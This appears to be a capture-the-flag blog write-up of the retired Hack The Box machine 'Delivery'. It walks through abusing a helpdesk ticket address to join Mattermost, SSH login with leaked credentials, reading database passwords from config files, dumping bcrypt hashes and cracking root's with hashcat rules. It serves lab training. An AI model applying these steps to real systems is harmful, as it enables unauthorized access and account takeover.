---
layout: single
title: "Hackthebox write-up: Delivery"
namespace: htb-delivery
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-05-22 16:00:00
header:
   teaser: https://i.imgur.com/FTjLM76.png
---

Hello guys!

This week’s machine will be **Delivery**, another easy-rated machine from [Hack The Box](https://www.hackthebox.eu/), created by [ippsec](https://app.hackthebox.eu/users/3769).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Delivery](https://i.imgur.com/7C0GCed.png){: .align-center}

This box's resolution was pretty interesting, where I had the opportunity to learn on how to crack passwords using a dictionary variation using `hashcat`, besides the several pivoting, until get to the user credentials, and then, getting root.

## Enumeration

As usual, started with a `nmap` quick scan to identify published services in this box.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.222
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 17:01 -03
Nmap scan report for 10.10.10.222
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.54 seconds
```

### 80/TCP - HTTP Service

Acessing the page and inspecting the source-code, identified that there's a link to **helpdesk.delivery.htb**. Added this dns entry to `/etc/hosts`, as well as `delivery.htb`, to make easier access and enumeration to this page.

![HTB Delivery - Website](https://i.imgur.com/DFYYSkN.png){: .align-center}

After clicking to *Contact us* link, the following information was shown, informing that as soon as we get a delivery.htb e-mail we could access the **MatterMost** server, which works at TCP 8065, according to enumeration.

> ## CONTACT US
> For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.

While looking for a way to get e-mail address with HelpDesk, raised a support ticket with dummy content while inspecting the requests using *BurpSuite*.

After submitting the request, received the information below, something crucial to obtain access to Mattermost: a **@delivery.htb** e-mail address!

![HTB Delivery - Helpdesk Website](https://i.imgur.com/Zh6GeDh.png){: .align-center}

Accessing the Mattermost platform, created an account using the osTicket provided e-mail. This way, in case we need to receive any kind of confirmation in a delivery.htb account, data will supposedly be sent to the incident history we have just created :smile:.

![HTB Delivery - Mattermost](https://i.imgur.com/6zMqj4N.png){: .align-center}

As expected, once reviewing the request history, we can see the account activation details from Mattermost, sent to **8024065@delivery.htb**.

![HTB Delivery - Email comment](https://i.imgur.com/TLIBKIn.png){: .align-center}

After verified the account, we were able to access the portal with the created credentials and had access to a public team called **Internal**.

![HTB Delivery - Mattermost - Account Confirmed](https://i.imgur.com/qN2YraR.png){: .align-center}

Among the messages available on this channel, some called attention, but some information was gathered that might be useful for machine resolution:

- osTicket Admin Credentials were **maildeliverer:Youve_G0t_Mail!**.
- Devs were using *variants of **PleaseSubscribe!*** as passwords everywhere and should stop using it.
  - These variants could be easily cracked using **`hashcat` rules**, which is a great tip on how to obtain the root password, or something in its path.

![HTB Delivery - Mattermost Internal Channel](https://i.imgur.com/8KP9NRl.png){: .align-center}

Searching in the osTicket administration page, made logoff of *Guest User*, from the left upper-corner and, during the sign-in process, selected the option **I'm an agent - sign in here**, which took me to `http://helpdesk.delivery.htb/scp/login.php`, where the incidents are managed.

![HTB Delivery - OsTicket Admin Portal](https://i.imgur.com/JsI5fmb.png){: .align-center}

Once logged in as **maildeliverer**, was able to confirm the osTicket version, which is **1.15.1**, where we're going to look for some existing exploit o weakness which could get us an initial access.

![HTB Delivery - OsTicket Version](https://i.imgur.com/vYiQjKN.png){: .align-center}

Browsing in the console, found an API, which mentions task execution through a scheduler using `cron`. Inspecting its documentation available at [this link](https://docs.osticket.com/en/latest/Developer%20Documentation/API/Tasks.html?highlight=cron) it mentions the file `scripts\rcron.php` which is used to orchestrate the calls.

Besides have created an API key for my IP Address and tried to use the script available at [this link](https://raw.githubusercontent.com/osTicket/osTicket/1.15.x/setup/scripts/rcron.php), **had no success on executing a payload through the application**.

## Initial Access and User Flag

Besides several attempts using osTicket API, gave some steps back and thinking simple, asked myself: Is **maildeliverer** a user at this machine? On I tried to SSH using its account I was able to not only connect to this machine (:man_facepalming:) but also get the flag in `user.txt`, available at his root directory.

```bash
$ ssh maildeliverer@10.10.10.222                                                                                                 
The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established.
ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.222' (ECDSA) to the list of known hosts.
maildeliverer@10.10.10.222's password:
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.10.10
maildeliverer@Delivery:~$ ls -la
total 28
drwxr-xr-x 3 maildeliverer maildeliverer 4096 Jan  3 23:12 .
drwxr-xr-x 3 root          root          4096 Dec 26 09:01 ..
lrwxrwxrwx 1 root          root             9 Dec 28 07:04 .bash_history -> /dev/null
-rw-r--r-- 1 maildeliverer maildeliverer  220 Dec 26 09:01 .bash_logout
-rw-r--r-- 1 maildeliverer maildeliverer 3526 Dec 26 09:01 .bashrc
drwx------ 3 maildeliverer maildeliverer 4096 Dec 28 06:58 .gnupg
-rw-r--r-- 1 maildeliverer maildeliverer  807 Dec 26 09:01 .profile
-r-------- 1 maildeliverer maildeliverer   33 Feb 24 06:58 user.txt
maildeliverer@Delivery:~$ cat user.txt
<redacted>
```

## Root flag

Started with `linpeas.sh` execution to automate enumeration and the following findings called attention:

- Process `python3 /root/py-smtp.py` running as **root**. Could eventually allow path hijack if it's calling some binaries without their full path.
- Also, **root** has a script `/root/mail.sh`, that could be abused the same way as the previous execution.
- MySQL instance running in its default port (TCP 3306).

### osTicket

As I couldn't read any of the two promising files for path hijack, started looking for credentials to get access to MySQL and try to dump some credentials. In osTicket install folder, have found `/var/www/osticket/upload/include/ost-config.php` which contained the creds for **ost_user**:

```ini
define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3');

define('ADMIN_EMAIL','maildeliverer@delivery.htb');

define('DBTYPE','mysql');
define('DBHOST','localhost');
define('DBNAME','osticket');
define('DBUSER','ost_user');
define('DBPASS','!H3lpD3sk123!');

define('TABLE_PREFIX','ost_');
```

Besides able to connect to MySQL, nothing useful was found, so decided to look for credentials in Mattermost installation.

### Mattermost

Based in the process in execution, app resides in `/opt/mattermost`, where I have found some credentials in the file `/opt/mattermost/config/config.json`.

```json
 "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    }
```

Using the credentials found (**mmuser:Crack_The_MM_Admin_PW**) connected to **mattermost** database and, at users table, found some password hashes, being **root** the only with **system_admin** permissions.

```plaintext
MariaDB [mattermost]> select Username,Password,Roles from Users;
+----------------------------------+--------------------------------------------------------------+--------------------------+
| Username                         | Password                                                     | Roles                    |
+----------------------------------+--------------------------------------------------------------+--------------------------+
| jdoe                             | $2a$10$qmuCH.AHht/dUGLd8ZyxMOMeZl6nU67B5okAiC0Vx44isKs5y6nkq | system_user              |
| surveybot                        |                                                              | system_user              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | system_user              |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | system_user              |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | system_admin system_user |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | system_user              |
| channelexport                    |                                                              | system_user              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | system_user              |
+----------------------------------+--------------------------------------------------------------+--------------------------+
```

As mentioned in the Internal Team, root's password wouldn't be in a dictionary like RockYou but could be a variation of `PleaseSubscribe!` and that **``hashcat` rules** could be the way to crack it. After some research found the following syntax:

- Created a file `basicpwd.txt` containing string `PleaseSubscribe!`;
- Used the file `best64.rule` which has one of the most popular password variations.

Executing it directly with the correct hash type (3200 - bcrypt), was able to find the password **PleaseSubscribe!21**

```bash
$ hashcat -a 0 -m 3200 hash basicpwd.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz, 5847/5911 MB (2048 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: basicpwd.txt
* Passwords.: 1
* Bytes.....: 17
* Keyspace..: 77
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
```

As root had no SSH access at this box, ran `su` and was able to connect as him and read the final flag :smiley:.

```bash
maildeliverer@Delivery:/opt/mattermost/config$ su root
Password:
root@Delivery:/opt/mattermost/config# cd /root/
root@Delivery:~# cat root.txt
<redacted>
root@Delivery:~#
```

Besides root flag, ippsec left us a message in `note.txt` file:

> I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times.  The inspiration for the box is here:
>
> \- `https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c`
>
> Keep on hacking! And please don't forget to subscribe to all the security streamers out there.
>
> \- ippsec

Hope you guys have enjoyed this box!

See you at the next post :smile:
